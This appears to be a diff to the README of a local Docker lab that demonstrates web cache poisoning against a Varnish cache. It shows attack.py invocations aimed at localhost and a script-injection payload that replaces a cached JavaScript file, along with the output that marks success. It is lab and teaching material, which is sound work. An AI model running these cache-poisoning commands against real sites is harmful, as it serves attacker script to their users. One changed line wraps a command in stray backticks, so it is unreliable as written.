@@ -47,12 +47,16 @@ Detailed project docs are available in [`docs/`](./docs/README.md):
 
 - Docker with `docker compose`
 - Python 3.10+
-- Optional: `pip install -r exploit/requirements.txt` if you want the HTTP/2 probe in `attack.py`
+- `uv` package manager. Install dependencies and activate the virtual environment:
+  ```bash
+  uv sync
+  source .venv/bin/activate
+  ```
 
 ## Start The Lab
 
 ```bash
-docker compose up --build -d
+`docker compose up --build -d`
 docker compose ps
 ```
 
@@ -75,14 +79,14 @@ Do **not** request `/js/app.js` before the attack if you plan to poison the plai
 
 ## Perform The Attack
 
-There are two reliable ways to run the demo.
+There are two reliable ways to run the demo. The recommended approach is to use a fresh cache key for each test to avoid collisions.
 
-### Option 1: Recommended, use a fresh cache key
+### Recommended: Use a fresh cache key
 
 This avoids collisions with an already-cached `/js/app.js`.
 
 ```bash
-python3 exploit/attack.py \
+python exploit/attack.py \
   --host localhost \
   --port 80 \
   --target-path '/js/app.js?cb=demo1'
@@ -91,11 +95,11 @@ python3 exploit/attack.py \
 Custom payload example:
 
 ```bash
-python3 exploit/attack.py \
+python exploit/attack.py \
   --host localhost \
   --port 80 \
   --target-path '/js/app.js?cb=demo2' \
-  --payload "<script>alert('owned')</script>"
+  --payload "<script>console.log('poisoned_script ran successfully'); alert('owned');</script>"
 ```
 
 Verify manually:
@@ -109,7 +113,7 @@ Successful output should show:
 - `X-Cache: HIT`
 - an HTML body containing your payload instead of the legitimate JavaScript file
 
-### Option 2: Poison the exact `/js/app.js` path
+### Alternative: Poison the exact `/js/app.js` path
 
 First reset Varnish so `/js/app.js` is not already cached:
 
@@ -120,10 +124,11 @@ docker compose restart cache-layer
 Then run:
 
 ```bash
-python3 exploit/attack.py \
+python exploit/attack.py \
   --host localhost \
   --port 80 \
-  --target-path /js/app.js
+  --target-path /js/app.js \
+  --payload "<script>console.log('poisoned_script ran successfully'); alert('owned');</script>"
 ```
 
 Manual verification:
@@ -131,6 +136,11 @@ Manual verification:
 ```bash
 curl -i http://localhost/js/app.js
 ```
+
+Successful output should show:
+
+- `X-Cache: HIT`
+- an HTML body containing your payload instead of the legitimate JavaScript file.
 
 ## What The Exploit Does
 
